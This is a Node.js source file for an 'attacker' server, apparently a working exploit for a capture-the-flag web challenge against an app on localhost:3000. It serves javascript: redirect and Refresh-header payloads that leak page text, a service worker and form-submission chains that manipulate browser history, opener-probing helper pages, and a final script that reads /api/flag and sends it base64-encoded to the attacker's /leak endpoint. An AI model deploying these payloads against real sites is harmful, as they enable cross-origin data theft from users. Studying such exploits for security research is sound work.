const http = require("node:http");
let lastLeak = "";
const diagnostics = [];

const server = http.createServer((req, res) => {
  const url = new URL(req.url, "http://127.0.0.1:8000");
  console.log("[attacker]", url.pathname, url.search);
  if (url.pathname === "/redirjs") {
    res.writeHead(302, { Location: "javascript:location='http://127.0.0.1:8000/leakraw?x='+encodeURIComponent(document.body.innerText)" });
    res.end();
    return;
  }
  if (url.pathname === "/hold204") {
    res.writeHead(204, { Refresh: "0; url=javascript:location='http://127.0.0.1:8000/leakraw?x='+encodeURIComponent(document.body.innerText)" });
    res.end();
    return;
  }
  if (url.pathname === "/leakraw") {
    lastLeak = url.searchParams.get("x") || "";
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
    return;
  }
  if (url.pathname === "/start") {
    const rid = url.searchParams.get("rid");
    const review = new URL("http://localhost:3000/review");
    review.searchParams.set("rid", rid);
    review.searchParams.set("u", `http://127.0.0.1:8000/payload.js?rid=${rid}`);
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" });
    res.end(`<!doctype html><script>
      (async()=>{
        await navigator.serviceWorker.register('/sw.js');
        await navigator.serviceWorker.ready;
        open(${JSON.stringify(review.href)}, 'review');
        setTimeout(() => location = '/step?n=1&rid=' + encodeURIComponent(${JSON.stringify(rid)}), 800);
      })();
    </script>`);
    return;
  }
  if (url.pathname === "/sw.js") {
    res.writeHead(200, { "Content-Type": "application/javascript", "Cache-Control": "no-store", "Service-Worker-Allowed": "/" });
    res.end(`addEventListener('fetch',e=>{const u=new URL(e.request.url);if(u.pathname!='/step')return;const n=+u.searchParams.get('n'),rid=u.searchParams.get('rid');const next=n<25?'/step?n='+(n+1)+'&rid='+rid:'http://localhost:3000/sandbox?rid='+rid;const code=n<25?'setTimeout(()=>location='+JSON.stringify(next)+',30)':'setTimeout(()=>{if(!sessionStorage.done){sessionStorage.done=1;location.replace('+JSON.stringify(next)+')}},30)';e.respondWith(new Response('<script>'+code+'<\\/script>',{headers:{'content-type':'text/html','cache-control':'no-store'}}))})`);
    return;
  }
  if (url.pathname === "/fill") {
    res.writeHead(200, { "Content-Type": "application/octet-stream", "Cache-Control": "public, max-age=3600" });
    res.end(Buffer.alloc(4 * 1024 * 1024, Number(url.searchParams.get("n")) & 255));
    return;
  }
  if (url.pathname === "/step") {
    const n = Number(url.searchParams.get("n") || 0);
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" });
    res.end(n < 20
      ? `<!doctype html><form action=http://s${n + 1}.localhost:8000/step><input name=n value=${n + 1}></form><script>onload=()=>setTimeout(()=>document.forms[0].submit(),40)</script>`
      : `<!doctype html><script>location='http://127.0.0.1:8000/final'</script>`);
    return;
  }
  if (url.pathname === "/final") {
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" });
    res.end(`<!doctype html><script>fetch('/diag?final='+history.length)</script>`);
    return;
  }
  if (url.pathname === "/helper") {
    res.writeHead(200, { "Content-Type": "text/html", "Cache-Control": "no-store" });
    res.end(`<!doctype html><script>
      setTimeout(() => {
        try {
          fetch('/diag?helper=' + opener.history.length + '&url=' + encodeURIComponent(opener.location.href));
          const savedLocation = opener.location;
          const savedHistory = opener.history;
          opener.history.go(2 - opener.history.length);
          setTimeout(() => {
            try { savedHistory.go(0); fetch('/diag?historyreload=ok'); }
            catch (e) { fetch('/diag?historyreloaderr=' + encodeURIComponent(e.name + ':' + e.message)); }
            try { savedLocation.reload(); fetch('/diag?reload=ok'); }
            catch (e) { fetch('/diag?reloaderr=' + encodeURIComponent(e.name + ':' + e.message)); }
            try { opener.location.reload(); fetch('/diag?directreload=ok'); }
            catch (e) { fetch('/diag?directreloaderr=' + encodeURIComponent(e.name + ':' + e.message)); }
            try { opener.location.replace('?probe=1'); fetch('/diag?replace=ok'); }
            catch (e) { fetch('/diag?replaceerr=' + encodeURIComponent(e.name + ':' + e.message)); }
            try { opener.location = ''; fetch('/diag?assignempty=ok'); }
            catch (e) { fetch('/diag?assignemptyerr=' + encodeURIComponent(e.name + ':' + e.message)); }
            try { opener.location.replace(''); fetch('/diag?replace=ok&closed=' + opener.closed); }
            catch (e) { fetch('/diag?replaceerr=' + encodeURIComponent(e.name + ':' + e.message)); }
          }, 500);
          document.title = 'went-back';
        } catch (e) {
          fetch('/diag?error=' + encodeURIComponent(e.name + ':' + e.message));
          document.title = e.name + ':' + e.message;
        }
      }, 5000);
    </script>`);
    return;
  }
  if (url.pathname === "/payload.js") {
    res.writeHead(200, { "Content-Type": "application/javascript" });
    res.end(`
      console.log('payload start', location.href, history.length, top === self, JSON.stringify(navigation.entries().map(e=>({url:e.url,key:e.key,index:e.index}))));
      if (top === self) {
        navigation.onnavigate = e => console.log('NAV', e.destination.url, e.navigationType, e.canIntercept);
        addEventListener('pagehide', () => { try { history.go(0) } catch (e) {} });
        setTimeout(() => history.go(2-history.length), 1500);
      } else {
        addEventListener('pagehide', () => {
          console.log('payload pagehide');
          try { top.postMessage('bye', '*'); } catch (e) {}
        });
      }
    `);
    return;
  }
  if (url.pathname === "/final.js") {
    res.writeHead(200, { "Content-Type": "application/javascript" });
    res.end(`const x=new XMLHttpRequest;x.open('GET','/api/flag',false);x.send();location='http://127.0.0.1:8000/leak?x='+btoa(x.responseText)`);
    return;
  }
  if (url.pathname === "/leak") {
    lastLeak = Buffer.from(url.searchParams.get("x") || "", "base64").toString();
    console.log("[FLAG]", lastLeak);
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
    return;
  }
  if (url.pathname === "/status") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end(lastLeak + "\n" + diagnostics.join("\n"));
    return;
  }
  if (url.pathname === "/diag") {
    diagnostics.push(url.search);
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
    return;
  }
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end("ok");
});

server.listen(8000, "127.0.0.1", () => console.log("attacker ready"));
